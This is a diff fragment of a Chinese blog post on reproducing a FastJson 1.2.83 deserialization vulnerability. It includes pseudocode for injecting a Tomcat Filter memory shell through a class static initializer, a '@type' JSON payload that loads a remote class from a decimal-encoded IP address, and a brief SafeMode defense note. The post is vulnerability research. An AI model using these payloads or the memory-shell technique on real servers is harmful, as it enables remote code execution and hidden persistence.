 <p>DK 9 重构了 class 文件解析器，加入了严格的类名校验：</p>
+<blockquote>
 <p>- 类名首字符不能是 &#x2F;</p>
 <p>- 类名尾字符不能是 &#x2F;</p>
 <p>- 类名中不能出现连续的 &#x2F;&#x2F;</p>
+</blockquote>
 <p>具体实现在 src&#x2F;hotspot&#x2F;share&#x2F;classfile&#x2F;classFileParser.cpp 的 verify_legal_class_name()函数中。</p>
 <p>你需要用 ASM 字节码在 <code>&lt;clinit&gt;</code> 里写出等价于下面 Java 逻辑的代码（用 ASM 指令拼）：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 伪代码逻辑（实际要用 ASM 字节码指令写出）</span><br><span class="line">static &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        // 1. 从线程上下文拿 Request 或遍历线程组找 catalina 线程</span><br><span class="line">        // 2. 反射链: Request -&gt; getContext() -&gt; StandardContext</span><br><span class="line">        // 3. 创建 FilterDef, setFilter(this), setFilterName(<span class="string">&quot;xxx&quot;</span>)</span><br><span class="line">        // 4. 创建 FilterMap, addURLPattern(<span class="string">&quot;/*&quot;</span>)</span><br><span class="line">        // 5. standardContext.addFilterDef(def)</span><br><span class="line">        // 6. standardContext.addFilterMap(map)</span><br><span class="line">    &#125; catch (Throwable t) &#123; /* 静默失败 */ &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-
-
-<h2 id="0x02-防御"><a href="#0x02-防御" class="headerlink" title="0x02 防御"></a>0x02 防御</h2><p><strong>1. 启用 SafeMode</strong> </p>
+<h2 id="0x02-防御"><a href="#0x02-防御" class="headerlink" title="0x02 防御"></a>0x02 防御</h2><p><strong>1. 启用 SafeMode</strong></p>
 <p>这样@type关键字就没有用了</p>
 <h2 id="0x03-遇到的问题"><a href="#0x03-遇到的问题" class="headerlink" title="0x03 遇到的问题"></a>0x03 遇到的问题</h2><p>刚刚开始的时候我调试，我使用十进制的格式的payload，但是java.lang.ClassLoader#getResource走到返回url为null，资源不存在</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JDK8 HTTP payload: &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;http:..2886994434:19090.a&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784881475235-1b8fd834-2109-4ba7-a7ed-11858a1d3556.png" alt="img"></p>
+<p><img src="/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-24.png" alt="image.png"></p>
 <p>然后自己尝试做了测试：然后就猜到有东西拦截了，想了一下，才发现是自己开了代理仅仅放行了ipv4的内网地址网段，后续换成了localhost就可以可以了</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://127.0.0.1:19090/a.class&quot;</span>).openConnection()  <span class="comment">// → 200</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://2130706433:19090/a.class&quot;</span>).openConnection() <span class="comment">// → 502</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2026/png/38477601/1784881830415-04ef9aa7-c203-4f2c-ae18-a834bcb62d46.png" alt="img"></p>
+<p><img src="/Users/n0ne/Downloads/%E8%AF%AD%E9%9B%80%E5%A4%87%E4%BB%BD/%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4/%E6%88%91%E4%B8%AA%E4%BA%BA%E7%9A%84/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/assets/FastJson_1.2.83_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-25.png" alt="image.png"></p>
 
     </div>
 
@@ -428,7 +446,7 @@
     <footer class="post-footer">
           <div class="post-tags">
               <a href="/tags/Java/" rel="tag"># Java</a>
-              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag"># 漏洞分析</a>
           </div>
 
         
